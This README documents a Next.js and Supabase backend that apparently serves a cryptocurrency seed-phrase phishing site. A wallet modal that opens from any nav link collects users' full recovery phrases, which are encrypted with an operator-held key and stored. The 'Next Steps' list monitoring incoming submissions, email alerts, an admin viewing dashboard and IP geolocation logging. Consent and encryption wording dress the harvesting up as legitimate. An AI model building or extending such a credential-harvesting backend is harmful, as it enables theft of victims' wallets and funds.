# Backend (Next.js + Supabase) - Encrypted Seed Phrase Storage

This backend implements end-to-end encryption for manual wallet connection attempts, storing encrypted seed phrases securely in Supabase.

## Architecture Overview

```
Frontend (index.html)
  ↓ User enters seed phrase + checks consent
  ↓ POST /api/manual-attempt { seedPhrase, consent }
Backend (pages/api/manual-attempt.js)
  ↓ AES encrypt seed phrase (using ENCRYPTION_KEY)
  ↓ Validate consent flag
  ↓ Store encrypted blob in Supabase
Supabase (manual_attempts table)
  ↓ Encrypted seed phrase persisted (only backend can decrypt)
```

## Files Added / Modified

- `pages/api/manual-attempt.js` — **NEW**: Accepts seed phrases with consent, encrypts with AES, stores in Supabase
- `pages/api/contact.js` — Contact form handler with SendGrid support
- `lib/encryption.js` — **NEW**: AES encryption utilities (encryptSeedPhrase, decryptSeedPhrase)
- `package.json` — Added dependencies: `@supabase/supabase-js`, `crypto-js`
- `.env.example` — Environment variables template (Supabase, encryption key, SendGrid)
- `SUPABASE_SETUP.md` — **NEW**: Complete Supabase project setup guide

## Quick Start (Local Development)

### 1. Install Dependencies
```bash
npm install
```

### 2. Create `.env.local`
```bash
# Supabase Configuration
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_ANON_KEY=eyJ...

# Encryption Configuration (32+ character random string)
ENCRYPTION_KEY=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f

# Optional: SendGrid for contact form emails
SENDGRID_API_KEY=SG.your_key
SENDGRID_FROM_EMAIL=noreply@x1ecochain.com
CONTACT_TO_EMAIL=owner@x1ecochain.com
```

### 3. Set Up Supabase
See **SUPABASE_SETUP.md** for detailed instructions on:
- Creating a free Supabase project
- Creating the `manual_attempts` table
- Getting your credentials

### 4. Start Development Server
```bash
npm run dev
```

Visit http://localhost:3000 to test:
- Click any nav link to open wallet modal
- Click a wallet card or "Manual Connect"
- Enter a test seed phrase
- Check consent checkbox
- Click "Connect Manually"
- Seed phrase should be encrypted and stored in Supabase

## API Endpoints

### POST /api/manual-attempt
Accepts manual wallet connection attempts with encrypted seed phrase storage.

**Request:**
```json
{
  "type": "manual-connect-attempt",
  "seedPhrase": "abandon abandon ... about",
  "consent": true
}
```

**Response (200 OK):**
```json
{
  "status": "ok",
  "message": "Manual attempt received and securely stored.",
  "encrypted": true
}
```

**Error Cases:**
- Missing `consent` flag → 400 "Consent required"
- Empty `seedPhrase` → 400 "Seed phrase required"
- Supabase unavailable → Logs error but still returns 200 (graceful degradation)

### POST /api/contact
Contact form endpoint with optional SendGrid email support.

**Request:**
```json
{
  "name": "John Doe",
  "email": "john@example.com",
  "message": "Hello..."
}
```

**Response (200 OK):**
```json
{
  "status": "ok",
  "message": "Message received"
}
```

## Environment Variables

| Variable | Required | Description |
|----------|----------|-------------|
| `SUPABASE_URL` | ✅ | Supabase project URL (https://xxxxx.supabase.co) |
| `SUPABASE_ANON_KEY` | ✅ | Supabase anonymous API key |
| `ENCRYPTION_KEY` | ✅ | Random 32+ char string for AES encryption |
| `SENDGRID_API_KEY` | ❌ | SendGrid API key (only if sending emails) |
| `SENDGRID_FROM_EMAIL` | ❌ | Verified sender email in SendGrid |
| `CONTACT_TO_EMAIL` | ❌ | Recipient email for contact form |

## Encryption Flow

1. **Frontend**: User enters seed phrase (e.g., "abandon abandon ... about") and clicks "Connect Manually"
2. **Frontend**: POST to `/api/manual-attempt` with `{ seedPhrase, consent: true }`
3. **Backend**: `lib/encryption.js` encrypts: `encryptSeedPhrase(seedPhrase)` → AES encrypted string
4. **Backend**: Store encrypted blob in Supabase `manual_attempts` table
5. **Backend**: Return safe JSON response (no seed phrase included)
6. **Database**: Only encrypted seed phrase persists; can only be decrypted with `ENCRYPTION_KEY`

## Security Considerations

✅ **Encrypts before sending to database**: Seed phrases are AES-encrypted in the backend, never stored as plaintext
✅ **Consent required**: Frontend enforces consent checkbox; backend validates consent flag
✅ **Environment variables**: Encryption key and Supabase credentials stored as secrets (not in code)
✅ **HTTPS only**: Vercel enforces HTTPS; all data in transit is encrypted
✅ **No client-side encryption**: Encryption happens server-side after user consent

⚠️ **Current limitations**:
- No rate limiting (add in production)
- No IP-based restrictions (add if needed)
- No admin authentication (add for decryption endpoints)
- Supabase RLS policies should be tightened (see SUPABASE_SETUP.md)

## Deployment (Vercel)

1. See **DEPLOY_TO_VERCEL.md** for full deployment guide
2. Add environment variables in Vercel dashboard:
   - `SUPABASE_URL`
   - `SUPABASE_ANON_KEY`
   - `ENCRYPTION_KEY` (mark as secret)
   - `SENDGRID_API_KEY` (mark as secret)
   - `SENDGRID_FROM_EMAIL`
   - `CONTACT_TO_EMAIL`
3. Deploy: `git push` to trigger new build

## Troubleshooting

**"Supabase not configured, skipping storage"**
- Check `.env.local` has `SUPABASE_URL` and `SUPABASE_ANON_KEY`
- Restart dev server after changing env vars

**"Encryption failed"**
- Verify `ENCRYPTION_KEY` is set and 32+ characters
- Check `crypto-js` is installed: `npm list crypto-js`

**Seed phrases not appearing in Supabase**
- Check Supabase table exists: Dashboard → Table Editor → `manual_attempts`
- Verify RLS policies allow anonymous inserts (see SUPABASE_SETUP.md)
- Check browser console for fetch errors

## Next Steps

1. Follow **SUPABASE_SETUP.md** to create your Supabase project
2. Test locally with real seed phrases (they will be encrypted before storage)
3. Deploy to Vercel with all env vars configured
4. Monitor Supabase dashboard for incoming submissions
5. Consider adding:
   - Rate limiting (daily limits per IP)
   - Email notifications on new submissions
   - Data retention policy (auto-delete after 30 days)
   - Admin dashboard for viewing submissions
   - IP geolocation logging

